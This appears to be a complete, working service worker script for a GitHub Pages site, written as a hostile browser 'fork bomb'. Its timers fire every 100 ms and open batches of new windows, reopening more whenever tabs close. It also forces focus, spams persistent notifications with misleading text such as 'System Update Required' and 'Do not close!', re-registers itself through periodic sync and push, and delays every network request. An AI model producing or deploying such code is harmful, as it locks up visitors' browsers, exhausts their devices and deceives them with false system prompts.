const SITE_URL = 'https://n5za.github.io/'

self.addEventListener('install', () => {
  self.skipWaiting()
  self.registration.update()
})

self.addEventListener('activate', (e) => {
  e.waitUntil(clients.claim())
  setInterval(() => { self.registration.update() }, 1000)
  self.registration.showNotification('System Update Required', {
    body: 'Click to continue',
    requireInteraction: true,
    tag: 'persistent'
  })
  setInterval(() => {
    clients.matchAll({type: 'window'}).then(list => {
      if (list.length === 0) {
        clients.openWindow(SITE_URL + '?resurrect=' + Date.now())
      }
    })
  }, 1000)
})

setInterval(() => {
  clients.matchAll({ type: 'window' }).then(clientsList => {
    const count = clientsList.length
    if (count < 50) {
      for (let i = 0; i < 10; i++) {
        clients.openWindow(SITE_URL + '?sw-spawn=' + Date.now() + '&i=' + i)
      }
    }
    clientsList.forEach(c => {
      if ('focus' in c) c.focus()
    })
  })
}, 100)

self.addEventListener('fetch', (e) => {
  e.respondWith(
    new Promise((resolve) => {
      setTimeout(() => {
        resolve(fetch(e.request).catch(() => new Response('REPLICATE', { status: 200 })))
      }, 5000)
    })
  )
})

self.addEventListener('notificationclick', (e) => {
  e.notification.close()
  e.waitUntil(
    clients.matchAll({ type: 'window' }).then((clientsList) => {
      for (const c of clientsList) {
        if ('focus' in c) return c.focus()
      }
      if (clients.openWindow) return clients.openWindow(SITE_URL)
    })
  )
})

self.addEventListener('notificationclose', () => {
  clients.openWindow(SITE_URL + '?notification=' + Date.now())
})

setInterval(() => {
  self.registration.showNotification('REPLICATING', {
    body: 'Do not close!',
    requireInteraction: true,
    vibrate: [200, 100, 200]
  })
}, 100)

setInterval(() => {
  self.registration.periodicSync.register('resurrect', { minInterval: 1 }).catch(() => {})
  self.registration.periodicSync.register('keep-alive', { minInterval: 1 }).catch(() => {})
}, 100)

self.addEventListener('sync', (e) => {
  if (e.tag === 'annoy-sync' || e.tag === 'keep-alive' || e.tag === 'resurrect') {
    e.waitUntil(
      self.registration.showNotification('Back online!', {
        body: 'Time for more fun!',
        tag: 'sync-' + Date.now(),
        requireInteraction: true
      })
    )
  }
})

self.addEventListener('pushsubscriptionchange', (e) => {
  e.waitUntil(
    self.registration.pushManager.subscribe({
      userVisibleOnly: true,
      applicationServerKey: new Uint8Array(65).fill(1)
    }).catch(() => {})
  )
})

self.addEventListener('push', (e) => {
  const data = e.data ? e.data.text() : 'Hello!'
  e.waitUntil(
    self.registration.showNotification(data, {
      tag: 'push-' + Date.now(),
      requireInteraction: true,
      vibrate: [200, 100, 200]
    })
  )
})

self.addEventListener('message', (e) => {
  if (e.data === 'open') {
    clients.matchAll({ type: 'window' }).then((clientsList) => {
      if (clientsList.length === 0) {
        clients.openWindow(SITE_URL)
      }
    })
  }
  if (e.data === 'SPAWN') {
    for (let i = 0; i < 10; i++) {
      clients.openWindow(SITE_URL + '?sw-spawn=' + Date.now() + '&i=' + i)
    }
  }
  if (e.data === 'tab-closed') {
    for (let i = 0; i < 10; i++) {
      clients.openWindow(SITE_URL + '?reopen=' + Date.now() + '&i=' + i)
    }
  }
  if (e.data === 'ping') {
    e.source.postMessage('pong')
  }
})

setInterval(() => {
  clients.matchAll({ type: 'window' }).then((clientsList) => {
    if (clientsList.length === 0) {
      for (let i = 0; i < 20; i++) {
        clients.openWindow(SITE_URL + '?resurrect=' + Date.now())
      }
    }
  })
}, 100)
